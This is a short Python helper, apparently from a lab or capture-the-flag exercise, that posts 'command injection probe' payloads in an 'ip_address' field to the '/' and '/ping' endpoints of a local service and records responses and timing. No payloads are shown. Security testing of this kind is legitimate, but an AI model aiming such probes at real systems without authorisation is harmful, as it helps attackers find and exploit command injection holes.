import requests
import time
import urllib.parse
import base64
import threading
from urllib.parse import quote

BASE_URL = "http://127.0.0.1:32943"
TIMEOUT = 30

def send_probe(payload):
    """Send a command injection probe and return response"""
    # Try common injection points - ip_address parameter is mentioned in context
    endpoints_to_try = [
        "/",
        "/ping",
    ]
    
    results = []
    for endpoint in endpoints_to_try:
        try:
            url = f"{BASE_URL}{endpoint}"
            data = {"ip_address": payload}
            
            resp = requests.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
            results.append({
                "endpoint": endpoint,
                "status": resp.status_code,
                "response": resp.text,
                "time": resp.elapsed.total_seconds()
            })
        except requests.RequestException as e:
            results.append({
                "endpoint": endpoint,
                "error": str(e)
            })
    
    return results

